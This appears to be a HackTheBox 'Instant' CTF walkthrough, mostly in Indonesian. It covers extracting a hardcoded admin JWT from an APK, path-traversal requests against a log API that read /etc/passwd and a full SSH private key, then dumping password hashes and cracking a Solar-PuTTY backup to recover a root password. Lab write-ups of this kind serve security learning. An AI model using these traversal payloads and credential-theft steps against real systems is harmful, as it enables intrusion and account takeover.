![[Pasted image 20250110145016.png]]

# 1. Active Ports

## TCP
![[Pasted image 20250110151729.png]]
## UDP
![[Pasted image 20250110155801.png]]

# 2. Port 80 (HTTP)

|             | instant.htb                                                                                                                                                                                                                                  | mywalletv2.instant.htb                                                                                                                                                                                                                                                                             |
| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Feature     | - Download Now => instant.apk                                                                                                                                                                                                                |                                                                                                                                                                                                                                                                                                    |
| Directory   | http://instant.htb/downloads/instant.apk => cek ==direktori traversoal==                                                                                                                                                                     | http://mywalletv1.instant.htb/api/v1/login<br>http://mywalletv1.instant.htb/api/v1/register<br>http://mywalletv1.instant.htb/api/v1/view/profile<br>http://mywalletv1.instant.htb/api/v1/initiate/transaction<br>http://mywalletv1.instant.htb/api/v1/confirm/pin<br><br>/api/v1/view/transactions |
| Subdomain   |                                                                                                                                                                                                                                              |                                                                                                                                                                                                                                                                                                    |
| Technology  | http://instant.htb/ [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.10.11.37], JQuery[3.2.1], Script, Title[Instant Wallet]<br> | Werkzeug/3.0.3 Python/3.12.3                                                                                                                                                                                                                                                                       |
| CVE         |                                                                                                                                                                                                                                              |                                                                                                                                                                                                                                                                                                    |
| Information | support@instant.htb                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                    |
# 3. APK
## Ekstrak APK
1. open with `jadx-gui instant.apk` => NOPE
2. open with `apktool d instant.apk` => BISA
```
$ grep -Hnri instant.htb instant/ 

terdapat dua domain yang ditemukan
mywalletv1.instant.htb
swagger-ui.instant.htb

```

3. open with mobsf => cek ==secret url==
terdapat log request admin
![[Pasted image 20250110222757.png]]
```
new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
```
![[Pasted image 20250110223605.png]]
```
HTTP/1.1 200 OK
Date: Fri, 10 Jan 2025 15:19:57 GMT
Server: Werkzeug/3.0.3 Python/3.12.3
Content-Type: application/json
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}
```
dapat Data Admin
![[Pasted image 20250110230302.png]]
![[Pasted image 20250110230236.png]]
### Akses swagger-ui.instant.htb
![[Pasted image 20250111140824.png]]
bisa login 
mencoba menganalisa dan mengakses semua API endpoint
1. /api/v1/admin/list/users
```
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}
```
2. ​/api​/v1​/admin​/read​/log -> dengan payload "../../../etc/passwd"
```
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

---

{
  "/home/shirohige/logs//../../../../etc/passwd": [
    "root:x:0:0:root:/root:/bin/bash\n",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
    "sync:x:4:65534:sync:/bin:/bin/sync\n",
    "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
    "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
    "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
    "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n",
    "dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n",
    "messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n",
    "systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n",
    "pollinate:x:102:1::/var/cache/pollinate:/bin/false\n",
    "polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n",
    "usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
    "sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n",
    "shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n",
    "_laurel:x:999:990::/var/log/laurel:/bin/false\n"
  ],
  "Status": 201
}

```
dapat dilihat kita mendapatkan ==directory traveral== , dan diketahui terdapat 2 user yaitu user ==root== dan ==shirohige==
coba ganti payload menjadi `/../../../home/shirohige/user.txt` -> dapat **==user.txt==**

3. /.ssh/id_rsa , Coba akses ssh private key 
```
http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa

---

{
  "/home/shirohige/logs//../../../home/shirohige/.ssh/id_rsa": [
    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
    "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\n",
    "-----END OPENSSH PRIVATE KEY-----\n"
  ],
  "Status": 201
}
```

login ssh dengan private key tsb, dan dapat shell
```
ssh -i id_rsa shirohige@instant.htb
```
# 4. Priviledge Escalation
## Cek command yang berhubungan dengan owner dan port
`sudo -l` -> tidak bisa
`groups` -> `shirohige and development`
`netstat -tunlp` -> bisa ada port open 8888 dan 8808
```
$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1331/python3        
tcp        0      0 127.0.0.1:8808          0.0.0.0:*               LISTEN      1336/python3        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```
coba buka port tsb dengan port forwarding
- port 8888 -> mywalletv1.instant.htb
- port  8808 ->  swagger-ui.instant.htb

## Cek db dari web
download instant.db
```
scp -i id_rsa2 shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db .

```

buka menggunakan sqlite3 di linux, t
```
sqlite> select * from wallet_users;
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
3|test|test@test.com|f5a0e962-6ca4-439b-84a0-03fe20cc1723|pbkdf2:sha256:600000$uNj1KHXIFags4rqQ$784e4f55de938a7dbb8e4542ead8086c67453433ce3383930ae5e273c74ecc3f|2025-01-11 11:43:54.480058|12345|instantian|active
4|test1|test1@test.com|1ed92544-f2a5-4df6-9855-d0b64a6a4d02|pbkdf2:sha256:600000$Cbnn7Du4e2B7TfkB$58cf6cc4686d4727df40e4b35e7c0174e9cfe3c28f764093f1ea6e0a29c2ee2e|2025-01-11 12:24:13.702972|12345|instantian|active
5|test2|test2@test.com|447fda7a-3982-4ea7-bd4f-ea78cb271592|pbkdf2:sha256:600000$x26eiEiaeKgT4WGK$c57670f9266bdc7c34deda6c0c90ff504616a8a5fc6064b71e394a296114c245|2025-01-11 12:31:15.233611|12345|instantian|active
6|test3|test3@test.com|87ea0dde-baf5-4aaa-9bb6-76589a8c9455|pbkdf2:sha256:600000$c9VER3OKShXbT8Xi$336c0999e21c41e7de97d03b1f209ac4582ba13fd07155f6c99318c498d54d36|2025-01-11 12:56:57.746720|12345|instantian|active
sqlite> 

```
coba encode dengan warzeug hashcracker, tidak ada hasil
```
python3 app.py -w /usr/share/wordlists/rockyou.txt pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978  
Proceeding with dictionary attack...
Processing chunks:   0%|▏                                                                                                                                                  | 14/14345 [00:01<17:55, 13.32it/s]
Processing chunks: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 14345/14345 [18:43<00:00, 12.76it/s]
Password not found in wordlist.
  
```
tidak ada hasil
## Linpeas
```
drwxr-xr-x 3 shirohige shirohige 4096 Oct  4 15:22 /opt/backups
drwxr-xr-x 2 shirohige shirohige 4096 Oct  4 15:22 Solar-PuTTY
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat
Found /home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db
 -> Extracting tables from /home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db (limit 20)
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat

```
file backup menarik
download session.backup.dat, crack file tsb dengan https://github.com/ItsWatchMakerr/SolarPuttyCracker

![[Pasted image 20250112094308.png]]

![[Pasted image 20250112094409.png]]

dapat root credentials
`root:12**24nzC!r0c%q12`

coba login lagi dengan ssh
`su root` masukkan password `12**24nzC!r0c%q12`

Dapat root flags